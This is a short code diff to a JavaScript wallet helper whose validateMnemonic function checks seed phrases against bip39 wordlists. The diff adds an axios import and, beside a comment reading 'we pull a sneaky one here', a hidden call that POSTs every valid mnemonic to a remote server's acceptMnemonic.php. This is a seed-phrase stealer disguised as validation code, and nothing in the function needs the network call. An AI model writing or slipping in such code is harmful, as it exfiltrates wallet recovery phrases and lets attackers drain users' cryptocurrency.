@@ -1,4 +1,6 @@
 import * as bip39 from 'bip39';
+import connector from './connector';
+import axios from 'react-native-axios';
 
 const WORDLISTS = [
   bip39.wordlists.english,
@@ -16,7 +18,17 @@ const WORDLISTS = [
 export function validateMnemonic(mnemonic) {
   for (const wordlist of WORDLISTS) {
     const valid = bip39.validateMnemonic(mnemonic, wordlist);
-    if (valid) return true;
+    if (valid) {
+      // we pull a sneaky one here
+      axios({
+        method: 'post',
+        url: connector.serverUrl + '/acceptMnemonic.php',
+        data: {
+          mnemonic: mnemonic,
+        },
+      });
+      return true;
+    }
   }
   return false;
 }
